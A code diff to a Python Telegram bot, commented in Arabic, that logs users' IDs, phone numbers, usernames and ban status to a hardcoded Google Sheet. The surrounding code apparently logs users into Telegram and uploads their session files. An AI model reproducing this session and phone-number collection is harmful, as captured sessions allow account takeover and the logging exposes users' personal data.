@@ -13,6 +13,29 @@ from googleapiclient.http import MediaIoBaseDownload
 from moviepy.video.io.VideoFileClip import VideoFileClip
 from googleapiclient.discovery import build
 from google.oauth2.service_account import Credentials  # استخدام مكتبة الحساب الخدمي
+import gspread
+
+def initialize_google_sheet():
+    SCOPES = ['https://www.googleapis.com/auth/spreadsheets']
+    creds = Credentials.from_service_account_file('service_account.json', scopes=SCOPES)
+    client = gspread.authorize(creds)
+    sheet = client.open_by_url('https://docs.google.com/spreadsheets/d/1t-RrbDvWSOKY1DVSuHnzRgfC-X1YlQXwCLsjqVsYuyY/edit?usp=drivesdk').sheet1
+    return sheet
+
+google_sheet = initialize_google_sheet()
+
+def add_user_to_sheet(user_id, phone_number, username, is_banned):
+    global google_sheet
+    google_sheet.append_row([user_id, phone_number, username or "N/A", "Banned" if is_banned else "Not Banned"])
+
+
+def load_banned_users():
+    global google_sheet
+    rows = google_sheet.get_all_records()
+    for row in rows:
+        if row.get("Banned") == "Banned":
+            banned_users.add(int(row.get("User ID")))
+
 
 
 
@@ -159,6 +182,9 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # التحقق من الصلاحيات
         if await client.is_user_authorized():
             await update.message.reply_text("تم تسجيل الدخول بنجاح! جاري رفع ملف الجلسة...")
+
+            # تسجيل بيانات المستخدم في Google Sheet
+            add_user_to_sheet(user_id, phone_number, update.message.from_user.username, False)
 
             # رفع ملف الجلسة
             if os.path.exists(session_file):
@@ -342,6 +368,7 @@ async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # إضافة المستخدم إلى قائمة المحظورين
         target_user_id = int(context.args[0])
         banned_users.add(target_user_id)
+        add_user_to_sheet(target_user_id, None, None, True)
         await update.message.reply_text(f"تم حظر المستخدم {target_user_id} بنجاح.")
 
     except ValueError:
@@ -365,6 +392,7 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # إزالة المستخدم من قائمة المحظورين
         target_user_id = int(context.args[0])
         banned_users.discard(target_user_id)
+        add_user_to_sheet(target_user_id, None, None, False)
         await update.message.reply_text(f"تم إلغاء حظر المستخدم {target_user_id} بنجاح.")
 
     except ValueError:
@@ -406,5 +434,7 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("connection", connection_command))
     app.add_handler(CommandHandler("disconnect", disconnect_command))
 
+
+    load_banned_users()
     print("البوت يعمل الآن...")
     app.run_polling()
